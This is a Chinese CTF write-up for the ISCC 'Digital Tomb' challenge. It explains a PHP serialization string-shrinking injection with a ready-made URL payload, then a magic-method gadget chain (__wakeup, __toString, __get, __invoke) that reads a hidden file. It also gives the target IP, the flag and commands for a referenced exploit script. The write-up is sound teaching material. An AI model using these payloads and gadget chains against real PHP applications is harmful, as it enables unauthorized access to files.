# Digital Tomb WP

目标：`http://39.105.213.28:10026/`

最终 flag：`ISCC{ankh_rune_sigma_47x_decrypted}`

## 一、题目结构

首页给了两个入口：

- `rune_trial.php`
- `mechanism_chamber.php`

两页都直接 `highlight_file(__FILE__)`，所以源码是明牌的。

## 二、第一关 `rune_trial.php`

核心代码逻辑：

```php
class nameA {
    public $x;
    public $y;
    public function __wakeup() {
        if ($this->y === 'admin123') {
            include('relic_manifest.php');
            echo "成功！文件名: " . $filename;
        }
    }
}

function p2($i) {
    $key = "bnhpjowd";
    for ($j = 0; $j < strlen($key); $j++) {
        $search .= chr(ord($key[$j]) - 1);
    }
    return str_replace($search, 'iscc', $i);
}

$obj = new nameA($input, $passwd);
$ser = serialize($obj);
$result = p1($ser);
unserialize($result);
```

### 1. 漏洞点

`"bnhpjowd"` 每个字符减一之后得到的是 `amgoinvc`，所以：

```php
str_replace("amgoinvc", "iscc", $ser)
```

把长度为 8 的字符串替换成长度为 4 的字符串。  
如果把 `amgoinvc` 塞进可控属性里，替换后序列化字符串会整体变短，但前面的 `s:<len>:"..."` 长度字段不会同步更新，于是 `unserialize()` 会发生错位解析。

### 2. 利用思路

令：

- `d = "amgoinvc" * 4`
- `p = '";s:1:"y";s:8:"admin123";}'`

原本 `x` 字段长度是 32，经过 4 次替换后只剩 16，整体少了 16 个字节。  
这样反序列化读取 `x` 时会把后面的内容错位吞进去，正好把我们在 `p` 里伪造的：

```php
";s:1:"y";s:8:"admin123";}
```

拼成新的属性结构，最终让 `__wakeup()` 判断成立。

### 3. 第一关 payload

```text
/rune_trial.php?d=amgoinvcamgoinvcamgoinvcamgoinvc&p=%22%3Bs%3A1%3A%22y%22%3Bs%3A8%3A%22admin123%22%3B%7D
```

返回得到第二关要读的文件名：

```text
W3f82KD9.txt
```

## 三、第二关 `mechanism_chamber.php`

关键类链：

```php
class RitualEngine {
    protected $settings;
    public $target;
    public $callback;

    public function run($file = null) { ... highlight_file($real); }

    public function __invoke() {
        $action = @unserialize($this->callback);
        [$obj, $method] = $action;
        $map = ['view' => 'run'];
        $obj->$real();
    }
}

class GateSentinel {
    public $object;
    public $tool;

    public function __toString() {
        if (isset($this->tool['blade'])) {
            $this->tool['blade']->object;
        }
        return "GateSentinel";
    }

    public function __wakeup() {
        if (preg_match("/\.\.|flag|etc/i", $this->object)) {
            $this->object = "index.html";
        }
    }
}

class Keystone {
    public $center;

    public function __get($name) {
        $processor = $this->center;
        if (is_callable($processor)) {
            return $processor();
        }
    }
}
```

### 1. 漏洞点

`unserialize($_POST['data'], ['allowed_classes' => ...])` 只限制类名，没有阻止魔术方法链。

触发链是：

```text
GateSentinel::__wakeup()
-> preg_match($this->object)
-> object 被当成字符串
-> GateSentinel::__toString()
-> $this->tool['blade']->object
-> Keystone::__get()
-> center 是可调用对象 RitualEngine
-> RitualEngine::__invoke()
-> unserialize($this->callback)
-> [$reader, 'view']
-> $reader->run()
-> highlight_file("W3f82KD9.txt")
```

### 2. 为什么能绕过过滤

- 黑名单只检查 `GateSentinel::$object`
- 我们把真正要读取的文件名放进 `RitualEngine::$target`
- `GateSentinel::$object` 放的是另一个对象，不包含 `flag` / `etc` / `..`
- `run()` 只允许读取当前目录下匹配 `/^[A-Za-z0-9_-]+\.txt$/` 的文件，刚好第一关给出的文件名满足规则

### 3. 利用结果

高亮读出文件内容：

```text
ISCC{ankh_rune_sigma_47x_decrypted}
```

## 四、利用脚本

仓库里已经附好脚本：[exp.py](./exp.py)

默认直接打题：

```bash
python exp.py
```

靶机如果波动比较大，可以调大超时：

```bash
python exp.py --timeout 20
```

也可以跳过第一关，直接指定第一关拿到的文件名：

```bash
python exp.py --filename W3f82KD9.txt
```

脚本输出示例：

```text
[+] stage1 filename: W3f82KD9.txt
[+] flag: ISCC{ankh_rune_sigma_47x_decrypted}
```
